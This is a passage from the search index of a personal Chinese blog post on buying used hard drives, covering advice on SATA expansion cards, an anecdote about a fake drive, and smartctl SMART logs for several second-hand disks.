<li>\u6709\u8fc7\u70ed\u6389\u76d8\u7684\u95ee\u9898</li> <li>\u5e26\u5bbd\u95ee\u9898\uff0c\u9700\u8981\u7ec4 RAID\uff0c\u540c\u65f6\u8bfb\u53d6</li> </ul> <p>\u4ef7\u683c</p> <ul> <li>\u6dd8\u5b9d pcie 3.0x1 \u8f6c 4 \u7684\u8981\u5356 86\u3002pcie2.0x1 Marvell 9125 \u4e5f\u662f\u8fd9\u4e2a\u4ef7\uff0c\u56fe\u7247\u4e2d\u4f1a\u6807\u4e00\u4e2a\u7a33\u5b9a\u4e8c\u5b57</li> <li>\u54b8\u9c7c marvell 9125 \u53ea\u9700\u8981 30 \u5143\u5de6\u53f3\uff0c</li> <li>\u54b8\u9c7c\u6709 30 \u7684 asm1064 \u662f\u534a\u9ad8\uff0casm1066 \u9700\u8981 55</li> </ul> <p>\u82af\u7247: marvell, ASM</p> <p>\u5382\u5546</p> <ul> <li>suu \u4f18\u901f</li> <li>\u4eae\u817e\uff0c\u8776\u821e</li> </ul> <p>\u7b54\u6848\uff1a</p> <p>\u9274\u4e8e\u662f\u8981\u9009\u62e9pcie 1X\u89c4\u683c\u7684\uff0c\u63a5\u53e3\u9650\u5b9a\u4e0a\u9650\u901f\u5ea6\uff0c4\u53e3sata\u6269\u5c55\u6700\u4f18\u9009\u62e9\u5e94\u8be5\u662fASM1064\uff0c2\u53e3sata\u6269\u5c55\u6700\u4f18\u9009\u62e9\u5e94\u8be5\u662fJMB582 ASM1166\u7684\u8bdd\uff0c\u9650\u4e8e\u63a5\u53e3\u901f\u5ea6\uff0c\u867d\u7136\u770b\u4e0a\u53bb\u662f\u63a5\u53e3\u80fd6\u4e2asata\uff0c\u4e0d\u8fc7\u53d1\u70ed\uff0c\u548c\u901f\u5ea6\uff0c\u90fd\u8fbe\u4e0d\u5230\u6700\u4f18\u3002 2\u53e3\u5347\u7ea7\u6f5c\u529b\u6709\u9650\uff0c\u6b63\u5e38\u5e94\u8be5\u9009\u62e94\u53e3\uff0c\u4e5f\u5c31\u662fASM1064\u82af\u7247\u7684\u3002</p> <p>\u5176\u5b83\u8ba8\u8bba</p> <p>|1068 2008 2308 3008 3408 \u7b49\u7b49\u7b49\u90fd\u8981\u52a0\u98ce\u6247  \u4e0d\u60f3\u52a0\u98ce\u6247\u7684\u8bdd\u76f4\u63a5\u4e70\u4e2aASM1166\u7684\u4e5f\u80fd\u7528</p> <p>\u4e70sas\u5361,2008,2308,3008\u90fd\u53ef\u4ee5,\u6bd4\u4ec0\u4e48\u9a6c\u724cASMedia\u5f3a\u591a\u4e86</p> <p>\u4e0d\u5728\u4e4e\u901f\u5ea6\uff0c\u800c\u5728\u4e4e\u7a33\u5b9a\u6027\u7684\u8bdd\u5c31LSI 9211-8i\uff08\u6bcf\u4e00\u4e2a\u63a5\u53e3\u53ef\u4ee5\u63a5\u4e00\u6761\u4e00\u62d6\u56db\u7684\u7ebf\uff0c2\u4e2a\u63a5\u53e3\u53ef\u603b\u5171\u63a58\u5757\u786c\u76d8\u3002it\u72ec\u7acb\u6a21\u5f0f\uff0c\u6bcf\u4e00\u5757\u786c\u76d8\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u6211\u4e4b\u524d\u7528\u7684\u8fd9\u4e2a\uff0c\u5f88\u4fbf\u5b9c\u624d\u767e\u591a\u5757\u3002 \u7a33\u5b9a\u6027\u771f\u7684\u662f\u6bd4pcie\u8f6csata\u7684\u5f3a\u592a\u591a\u4e86\uff0c\u6bd5\u7adf\u8fd9\u662f\u7528\u5728\u670d\u52a1\u5668\u4e0a\u7684\uff0c\u7a33\u5b9a\u6027\u4e0d\u597d\u7684\u65e9\u5c31\u88ab\u7b5b\u4e0b\u6765\u4e86\uff0c\u7f3a\u70b9\u662f\u529f\u7387\u9ad8\uff0c15W\u3002  \u4f60\u53ef\u4ee5\u770b\u5230PCIE\u8f6csata\u7684\u8bc4\u8bba\u6709\u6389\u76d8\u73b0\u8c61\u7684\uff0c\u4f46\u8fd9HBA\u76f4\u901a\u5361\u51e0\u4e4e\u6ca1\u542c\u8bf4\u8fc7\u3002</p> <p>\u5982\u679c\u4e0d\u7528\u80cc\u677f\uff0c\u4e70ASM1166\uff0c\u6b21\u4e00\u6b65\u63a8\u8350JMB585\uff0c\u4e0d\u8981\u4e7088SE9235\uff0c\u592a\u8001\u592a\u6162\u4e86 \u3002\u4e0d\u8981\u4e70M2\u8f6cSATA\u7684\uff0cM2\u5361\u592a\u8584\u4e86\uff0c\u53cd\u590d\u62d4\u63d2SATA\u63a5\u53e3\u5bb9\u6613\u51fa\u95ee\u9898</p> <p>\u6dd8\u5b9d\u4e0a\u51e0\u5341\u5757JMS585\uff0c\u8bb0\u5f97\u7ed9\u82af\u7247\u4e0a\u4e2a\u5c0f\u6563\u70ed\u7247\u5c31\u884c\uff0c\u5341\u5206\u7a33\u5b9a\uff0c\u5f53\u521dP\u76d8\u8001\u677f\u63a8\u8350\u7ed9\u6211\u7684</p> <p>LSI 2308\u4e4b\u7c7b\u7684\u76f4\u901a\u5361\uff0c\u6ca1\u6709\u7f13\u5b58\u7684\u5e26\u5bbd\u4e5f\u8d85\u8fc7ASM1166\u5427\uff1f\u4ef7\u94b1\u90fd\u4e00\u6837\u751a\u81f3\u8fd8\u66f4\u4fbf\u5b9c</p> <p>\u6dd8\u5b9d ssu\u90a3\u5bb6\u4e70 as1106 \u8fd8\u662f66\uff0c\u770b\u4e0d\u6e05\u3002 \u6389\u76d8 \u5361\u6b7b\u3002\u5f04\u7684\u786c\u76d8\u5168\u662fC7.CRC\u597d\u60e8</p> <p>\u7b11\u6b7b 33 + 5 \u4e70\u4e86\u4e00\u4e2a asm1064 \u7684\u6269\u5c55\u5361\uff0c\u5356\u5bb6\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u8f6c 8 \u53e3\u7684\u6269\u5c55\u5361\u3002\u641c\u4e86\u4e00\u4e0b\u662f \uff1a8 SATA Ports PCIE SATA Controller Card, 6 Gbps SATA 3.0 Controller, Comes with 8 SATA Data Cables, PCI Express Card Support 8 SATA 3.0 Devices, Support Windows, MAC, Linux: Amazon.de: Computer &amp; Accessories</p> <ul> <li>1-5 \u4f7f\u7528 JBM575, 6-8 \u4f7f\u7528 asm1064</li> <li>amzon \u663e\u793a\u662f\u652f\u6301 pcie3.0 \u7684</li> </ul>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u4e70\u786c\u76d8\u8da3\u4e8b","title":"\u4e70\u786c\u76d8\u8da3\u4e8b","text":"<p>\u65e5\u7acb\u6e05\u96f6\u76d8\u8d34\u5e0c\u6377\u6807\uff08\u65e5\u7acb\u88ab\u897f\u6570\u6536\u8d2d\u4e86\uff09\uff0c\u597d\u4e2aNTR\u3002\u4e0d\u8fc7\u548c\u5356\u5bb6\u804a\u611f\u89c9\u5356\u5bb6\u53c8\u6ca1\u6709\u95ee\u9898\uff0c\u751a\u81f3\u6211\u8bf4\u5982\u679c\u6709\u8d28\u91cf\u95ee\u9898\u6211\u51fa\u8fd0\u8d39\u9000\u6b3e\u5356\u5bb6\u4e5f\u4e0d\u540c\u610f\uff08\u56e0\u4e3a\u5356\u5bb6\u4e0d\u4f1a\u770bsmart\uff0c\u8bf4\u8981\u7b49\u53bb\u7535\u8111\u5e97\u770b\u4e86\u518d\u5356\uff09\u3002\u5982\u679c\u8981\u9a97\u6211\u6211\u4e0d\u662f\u65e9\u5c31\u4e0a\u94a9\u4e86\u5417\u3002\u53ef\u80fd\u5356\u5bb6\u81ea\u5df1\u4e5f\u662f\u4ece\u54ea\u6536\u6765\u7684\u5047\u76d8\u3002 </p> <p>\u770b\u7740\u63cf\u8ff0\u5f88\u771f\u5b9e </p> <p>\u4f46\u662f\u4e00\u770b\u76d8\uff0c\u600e\u4e48\u53c8\u662f\u65e5\u7acb\uff01 </p> <p>\u6b38\uff0cwd40ejrx-78<sub>~\u641c\u5230\u4e24\u79cd\u5916\u89c2\u7684\uff0c\u597d\u50cf\u771f\u7684\u6709\u8fd9\u79cd\u5916\u89c2\u7684</sub>~\u3002\u786e\u5b9e\u5c31\u662f\u8fd9\u4e2a\u5916\u89c2\uff0c\u53e6\u4e00\u4e2a\u641c\u51fa\u6765\u7684\u662fwd40purx-78</p> <p>China WD Purple 4TB Surveillance Internal Hard Drive Disk 3.5\u2033 HDD HD Harddisk for CCTV DVR NVR Manufacture and Factory | Tianfeng (skywindintl.com) </p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u4e8c\u624b\u786c\u76d8\u72b6\u6001\u65e5\u5fd7\u8bb0\u5f55","title":"\u4e8c\u624b\u786c\u76d8\u72b6\u6001\u65e5\u5fd7\u8bb0\u5f55","text":"<p>\u8ffd\u8e2a\u4e0b\u4e8c\u624b\u786c\u76d8\u7684 smart \u53d8\u5316\uff0c\u4e4b\u540e\u574f\u4e86\u7684\u65f6\u5019\uff0c\u770b\u4e0b\u4ec0\u4e48\u76d8\u66f4\u5bb9\u6613\u574f</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#3t-150","title":"3T: 150","text":"<p>\u5185\u8499\u53e4\u53d1\u6765\u7684\uff0c\u5305\u88c5\u4e5f\u7b80\u6613\uff0c\u6ce1\u6cab\u7528\u5c11\u4e86\uff0c\u5230\u8fbe\u65f6\u90fd\u70c2\u4e86\uff0c\u5230\u8fbe\u65f6\u786c\u76d8\u4e00\u4e2a\u811a\u90fd\u53ef\u4ee5\u4ece\u5916\u9762\u770b\u5230\u3002</p> <ul> <li>ST3000DM001-1CH166, date: 15274, 45736h, 836\u6b21, SN: Z1F5V8VG</li> </ul>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#update-20241027","title":"update 2024/10/27:","text":"<p>\u51fa\u73b0\u574f\u5757\u4e86\uff0cCurrent_Pending_Sector \u548c Offline_Uncorrectable \u90fd\u4e3a 56</p> <pre><code>Vendor Specific SMART Attributes with Thresholds:\nID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000f   117   099   006    Pre-fail  Always       -       123237480\n  3 Spin_Up_Time            0x0003   092   092   000    Pre-fail  Always       -       0\n  4 Start_Stop_Count        0x0032   099   099   020    Old_age   Always       -       1856\n  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000f   087   060   030    Pre-fail  Always       -       658872500\n  9 Power_On_Hours          0x0032   043   043   000    Old_age   Always       -       50720\n 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   020    Old_age   Always       -       913\n183 Runtime_Bad_Block       0x0032   100   100   000    Old_age   Always       -       0\n184 End-to-End_Error        0x0032   100   100   099    Old_age   Always       -       0\n187 Reported_Uncorrect      0x0032   100   100   000    Old_age   Always       -       0\n188 Command_Timeout         0x0032   100   100   000    Old_age   Always       -       0 0 0\n189 High_Fly_Writes         0x003a   029   029   000    Old_age   Always       -       71\n190 Airflow_Temperature_Cel 0x0022   065   043   045    Old_age   Always   In_the_past 35 (1 28 35 33 0)\n191 G-Sense_Error_Rate      0x0032   100   100   000    Old_age   Always       -       0\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       201\n193 Load_Cycle_Count        0x0032   057   057   000    Old_age   Always       -       87281\n194 Temperature_Celsius     0x0022   035   057   000    Old_age   Always       -       35 (128 0 0 0 0)\n197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       56\n198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       56\n199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0\n240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       49516h+21m+18.505s\n241 Total_LBAs_Written      0x0000   100   253   000    Old_age   Offline      -       404773325173\n242 Total_LBAs_Read         0x0000   100   253   000    Old_age   Offline      -       52378779646\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#2024-03-14","title":"2024-03-14","text":"<pre><code>ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000f   106   080   006    Pre-fail  Always       -       194584153\n  3 Spin_Up_Time            0x0003   093   092   000    Pre-fail  Always       -       0\n  4 Start_Stop_Count        0x0032   099   099   020    Old_age   Always       -       1873\n  5 Reallocated_Sector_Ct   0x0033   086   086   010    Pre-fail  Always       -       17560\n  7 Seek_Error_Rate         0x000f   088   060   030    Pre-fail  Always       -       773405272\n  9 Power_On_Hours          0x0032   039   039   000    Old_age   Always       -       53955\n 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   020    Old_age   Always       -       928\n183 Runtime_Bad_Block       0x0032   100   100   000    Old_age   Always       -       0\n184 End-to-End_Error        0x0032   100   100   099    Old_age   Always       -       0\n187 Reported_Uncorrect      0x0032   001   001   000    Old_age   Always       -       870\n188 Command_Timeout         0x0032   100   100   000    Old_age   Always       -       0 0 0\n189 High_Fly_Writes         0x003a   022   022   000    Old_age   Always       -       78\n190 Airflow_Temperature_Cel 0x0022   069   043   045    Old_age   Always   In_the_past 31 (1 28 39 28 0)\n191 G-Sense_Error_Rate      0x0032   100   100   000    Old_age   Always       -       0\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       213\n193 Load_Cycle_Count        0x0032   057   057   000    Old_age   Always       -       87306\n194 Temperature_Celsius     0x0022   031   057   000    Old_age   Always       -       31 (128 0 0 0 0)\n197 Current_Pending_Sector  0x0012   090   087   000    Old_age   Always       -       1728\n198 Offline_Uncorrectable   0x0010   090   087   000    Old_age   Offline      -       1728\n199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0\n240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       52751h+08m+21.513s\n241 Total_LBAs_Written      0x0000   100   253   000    Old_age   Offline      -       447211245325\n242 Total_LBAs_Read         0x0000   100   253   000    Old_age   Offline      -       125274907112\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#2x3t-330","title":"2x3T: 330","text":"<ul> <li>ST3000DM001-1ER166, DOM: 140CT2016, 10537h, 237\u6b21, SN: Z503Z1KS</li> <li>ST3000DM001-1ER166, DOM: 140CT2016, 12438h, 238\u6b21, SN: Z503YWZM</li> </ul> <p>record 2024/10/30 <pre><code>ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000f   118   099   006    Pre-fail  Always       -       188322528\n  3 Spin_Up_Time            0x0003   095   094   000    Pre-fail  Always       -       0\n  4 Start_Stop_Count        0x0032   100   100   020    Old_age   Always       -       356\n  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000f   082   060   030    Pre-fail  Always       -       4475272048\n  9 Power_On_Hours          0x0032   083   083   000    Old_age   Always       -       15521\n 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   020    Old_age   Always       -       276\n183 Runtime_Bad_Block       0x0032   100   100   000    Old_age   Always       -       0\n184 End-to-End_Error        0x0032   100   100   099    Old_age   Always       -       0\n187 Reported_Uncorrect      0x0032   100   100   000    Old_age   Always       -       0\n188 Command_Timeout         0x0032   100   100   000    Old_age   Always       -       0 0 0\n189 High_Fly_Writes         0x003a   083   083   000    Old_age   Always       -       17\n190 Airflow_Temperature_Cel 0x0022   065   059   045    Old_age   Always       -       35 (Min/Max 32/35)\n191 G-Sense_Error_Rate      0x0032   100   100   000    Old_age   Always       -       0\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       196\n193 Load_Cycle_Count        0x0032   099   099   000    Old_age   Always       -       2515\n194 Temperature_Celsius     0x0022   035   041   000    Old_age   Always       -       35 (0 2 0 0 0)\n197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0\n240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       11797h+06m+05.185s\n241 Total_LBAs_Written      0x0000   100   253   000    Old_age   Offline      -       116525979925\n242 Total_LBAs_Read         0x0000   100   253   000    Old_age   Offline      -       3604316878770\n</code></pre></p> <pre><code>ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000f   115   099   006    Pre-fail  Always       -       84250416\n  3 Spin_Up_Time            0x0003   094   094   000    Pre-fail  Always       -       0\n  4 Start_Stop_Count        0x0032   100   100   020    Old_age   Always       -       279\n  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000f   082   060   030    Pre-fail  Always       -       175222231\n  9 Power_On_Hours          0x0032   081   081   000    Old_age   Always       -       17422\n 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   020    Old_age   Always       -       277\n183 Runtime_Bad_Block       0x0032   100   100   000    Old_age   Always       -       0\n184 End-to-End_Error        0x0032   100   100   099    Old_age   Always       -       0\n187 Reported_Uncorrect      0x0032   100   100   000    Old_age   Always       -       0\n188 Command_Timeout         0x0032   100   099   000    Old_age   Always       -       0 0 2\n189 High_Fly_Writes         0x003a   045   045   000    Old_age   Always       -       55\n190 Airflow_Temperature_Cel 0x0022   065   055   045    Old_age   Always       -       35 (Min/Max 34/36)\n191 G-Sense_Error_Rate      0x0032   100   100   000    Old_age   Always       -       0\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       31\n193 Load_Cycle_Count        0x0032   001   001   000    Old_age   Always       -       441001\n194 Temperature_Celsius     0x0022   035   045   000    Old_age   Always       -       35 (0 3 0 0 0)\n197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0\n240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       14975h+41m+35.201s\n241 Total_LBAs_Written      0x0000   100   253   000    Old_age   Offline      -       134141150911\n242 Total_LBAs_Read         0x0000   100   253   000    Old_age   Offline      -       78011318500\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#2x3t-326","title":"2x3T: 326","text":"<ul> <li>ST3000DM008-2DM166, DOM: 09APR2018, 37764h, 5353\u6b21, Z505BZTC</li> <li>ST3000DM008-2DM166, DOM: 09APR2018, 38368h, 7024\u6b21, Z505BZYA</li> </ul> <p>record 2024/10/30 <pre><code>Vendor Specific SMART Attributes with Thresholds:\nID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000f   108   099   006    Pre-fail  Always       -       20428872\n  3 Spin_Up_Time            0x0003   094   093   000    Pre-fail  Always       -       0\n  4 Start_Stop_Count        0x0032   095   095   020    Old_age   Always       -       5418\n  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000f   085   060   030    Pre-fail  Always       -       395736565\n  9 Power_On_Hours          0x0032   052   052   000    Old_age   Always       -       42856\n 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   098   098   020    Old_age   Always       -       2249\n183 Runtime_Bad_Block       0x0032   098   098   000    Old_age   Always       -       2\n184 End-to-End_Error        0x0032   100   100   099    Old_age   Always       -       0\n187 Reported_Uncorrect      0x0032   100   100   000    Old_age   Always       -       0\n188 Command_Timeout         0x0032   100   099   000    Old_age   Always       -       5 5 7\n189 High_Fly_Writes         0x003a   083   083   000    Old_age   Always       -       17\n190 Airflow_Temperature_Cel 0x0022   066   038   045    Old_age   Always   In_the_past 34 (9 62 35 33 0)\n191 G-Sense_Error_Rate      0x0032   100   100   000    Old_age   Always       -       0\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       234\n193 Load_Cycle_Count        0x0032   001   001   000    Old_age   Always       -       271565\n194 Temperature_Celsius     0x0022   034   062   000    Old_age   Always       -       34 (0 5 0 0 0)\n197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0\n240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       26974h+14m+11.038s\n241 Total_LBAs_Written      0x0000   100   253   000    Old_age   Offline      -       119287401865\n242 Total_LBAs_Read         0x0000   100   253   000    Old_age   Offline      -       2198955886258\n</code></pre></p> <pre><code>ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000f   119   099   006    Pre-fail  Always       -       226804784\n  3 Spin_Up_Time            0x0003   095   094   000    Pre-fail  Always       -       0\n  4 Start_Stop_Count        0x0032   094   094   020    Old_age   Always       -       7093\n  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000f   086   060   030    Pre-fail  Always       -       421300751\n  9 Power_On_Hours          0x0032   051   051   000    Old_age   Always       -       43461\n 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   098   098   020    Old_age   Always       -       2394\n183 Runtime_Bad_Block       0x0032   096   096   000    Old_age   Always       -       4\n184 End-to-End_Error        0x0032   100   100   099    Old_age   Always       -       0\n187 Reported_Uncorrect      0x0032   100   100   000    Old_age   Always       -       0\n188 Command_Timeout         0x0032   100   099   000    Old_age   Always       -       10 10 12\n189 High_Fly_Writes         0x003a   092   092   000    Old_age   Always       -       8\n190 Airflow_Temperature_Cel 0x0022   065   043   045    Old_age   Always   In_the_past 35 (1 234 36 34 0)\n191 G-Sense_Error_Rate      0x0032   100   100   000    Old_age   Always       -       0\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       360\n193 Load_Cycle_Count        0x0032   006   006   000    Old_age   Always       -       188607\n194 Temperature_Celsius     0x0022   035   057   000    Old_age   Always       -       35 (0 6 0 0 0)\n197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0\n240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       24028h+57m+24.890s\n241 Total_LBAs_Written      0x0000   100   253   000    Old_age   Offline      -       116273564141\n242 Total_LBAs_Read         0x0000   100   253   000    Old_age   Offline      -       2387222301822\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#1x2t-110","title":"1x2T: 110","text":"<ul> <li>WDC WD20EJRX-89G3VY0, WD-WCC4M0KDNUE5, 2018-05-12</li> <li>WDC WD20EJRX-89AKWY0, WD-WX12D415NAFF \uff08\u81ea\u5df1 2021/09/09 jd \u897f\u90e8\u6570\u636e\u4eac\u4e1c\u81ea\u8425\u65d7\u8230\u5e97 340 \u4e70\u7684\uff09</li> </ul> <p>record 2024/10/30 <pre><code>ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x002f   200   200   051    Pre-fail  Always       -       0\n  3 Spin_Up_Time            0x0027   177   163   021    Pre-fail  Always       -       4141\n  4 Start_Stop_Count        0x0032   094   094   000    Old_age   Always       -       6337\n  5 Reallocated_Sector_Ct   0x0033   200   200   140    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x002e   200   200   000    Old_age   Always       -       0\n  9 Power_On_Hours          0x0032   061   061   000    Old_age   Always       -       28613\n 10 Spin_Retry_Count        0x0032   100   100   000    Old_age   Always       -       0\n 11 Calibration_Retry_Count 0x0032   100   100   000    Old_age   Always       -       0\n 12 Power_Cycle_Count       0x0032   099   099   000    Old_age   Always       -       1913\n192 Power-Off_Retract_Count 0x0032   200   200   000    Old_age   Always       -       617\n193 Load_Cycle_Count        0x0032   199   199   000    Old_age   Always       -       5796\n194 Temperature_Celsius     0x0022   112   079   000    Old_age   Always       -       35\n196 Reallocated_Event_Count 0x0032   200   200   000    Old_age   Always       -       0\n197 Current_Pending_Sector  0x0032   200   200   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0030   100   253   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x0032   200   200   000    Old_age   Always       -       10\n200 Multi_Zone_Error_Rate   0x0008   100   253   000    Old_age   Offline      -       0\n</code></pre></p> <pre><code>ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x002f   200   200   051    Pre-fail  Always       -       0\n  3 Spin_Up_Time            0x0027   201   200   021    Pre-fail  Always       -       2908\n  4 Start_Stop_Count        0x0032   100   100   000    Old_age   Always       -       878\n  5 Reallocated_Sector_Ct   0x0033   200   200   140    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x002e   200   200   000    Old_age   Always       -       0\n  9 Power_On_Hours          0x0032   066   066   000    Old_age   Always       -       24840\n 10 Spin_Retry_Count        0x0032   100   100   000    Old_age   Always       -       0\n 11 Calibration_Retry_Count 0x0032   100   100   000    Old_age   Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   000    Old_age   Always       -       591\n192 Power-Off_Retract_Count 0x0032   200   200   000    Old_age   Always       -       141\n193 Load_Cycle_Count        0x0032   200   200   000    Old_age   Always       -       738\n194 Temperature_Celsius     0x0022   114   095   000    Old_age   Always       -       33\n196 Reallocated_Event_Count 0x0032   200   200   000    Old_age   Always       -       0\n197 Current_Pending_Sector  0x0032   200   200   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0030   100   253   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x0032   200   200   000    Old_age   Always       -       0\n200 Multi_Zone_Error_Rate   0x0008   100   253   000    Old_age   Offline      -       0\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#12-t-huh721212ale601-sn-8cg3vlke","title":"12 T HUH721212ALE601 SN: 8CG3VLKE","text":"<pre><code>SMART Attributes Data Structure revision number: 16\nVendor Specific SMART Attributes with Thresholds:\nID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000b   100   100   016    Pre-fail  Always       -       0\n  2 Throughput_Performance  0x0005   132   132   054    Pre-fail  Offline      -       96\n  3 Spin_Up_Time            0x0007   253   253   024    Pre-fail  Always       -       244 (Average 264)\n  4 Start_Stop_Count        0x0012   100   100   000    Old_age   Always       -       1593\n  5 Reallocated_Sector_Ct   0x0033   100   100   005    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000b   100   100   067    Pre-fail  Always       -       0\n  8 